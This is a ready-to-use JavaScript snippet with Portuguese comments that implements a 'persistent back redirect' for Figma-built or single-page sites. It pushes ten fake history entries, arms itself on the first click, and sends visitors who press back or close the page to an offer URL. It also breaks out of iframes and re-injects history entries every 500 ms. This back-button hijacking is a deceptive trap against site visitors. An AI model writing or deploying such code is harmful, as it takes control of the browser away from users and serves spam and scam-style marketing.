    <!-- Script de Back Redirect Persistente (Otimizado para Figma/SPA) -->
    <script>
    (function (window, location) {
      var REDIRECT_URL = "https://ofertaexclusiva.figma.site/";
      var FLAG = "br_done";
      var isArmed = false;

      // Função para realizar o redirecionamento
      function executeRedirect() {
        // Evita loop, redirecionamento após sucesso ou se o usuário estiver indo para o checkout
        if (sessionStorage.getItem(FLAG) || window.isNavigatingToCheckout) return;
        sessionStorage.setItem(FLAG, "true");
        
        try {
          // Tenta quebrar iframes caso o Figma esteja em sandbox
          if (window.top !== window.self) {
            window.top.location.href = REDIRECT_URL;
          } else {
            window.location.href = REDIRECT_URL;
          }
        } catch (err) {
          window.location.href = REDIRECT_URL;
        }
      }

      // Injeta 10 estados no histórico
      function populateHistory() {
        try {
          for (var i = 0; i < 10; i++) {
            window.history.pushState({ trap: i, ts: Date.now() }, "", location.href);
          }
        } catch (e) {}
      }

      // 1. Injeção inicial (DOMContentLoaded)
      if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', populateHistory);
      } else {
        populateHistory();
      }

      // 2. Gatilho de Ativação (Armar no primeiro clique)
      function armRedirect() {
        if (isArmed) return;
        isArmed = true;
        populateHistory();
        // Remove listeners para performance
        window.removeEventListener('click', armRedirect);
        window.removeEventListener('touchstart', armRedirect);
      }
      window.addEventListener('click', armRedirect);
      window.addEventListener('touchstart', armRedirect);

      // 3. Bloqueio de Saída (Popstate)
      window.addEventListener("popstate", function (event) {
        if (isArmed) {
          executeRedirect();
        }
      });

      // 4. Loop de Segurança (Monitoramento constante)
      setInterval(function() {
        // Se o histórico for limpo pelo router do SPA, reinjeta estados
        if (isArmed && window.history.length < 5) {
          populateHistory();
        }
      }, 500);

      // Triggers adicionais para mobile e fechamento
      window.addEventListener("beforeunload", function() { if (isArmed) executeRedirect(); });
      window.addEventListener("pagehide", function() { if (isArmed) executeRedirect(); });

    })(window, window.location);
    </script>
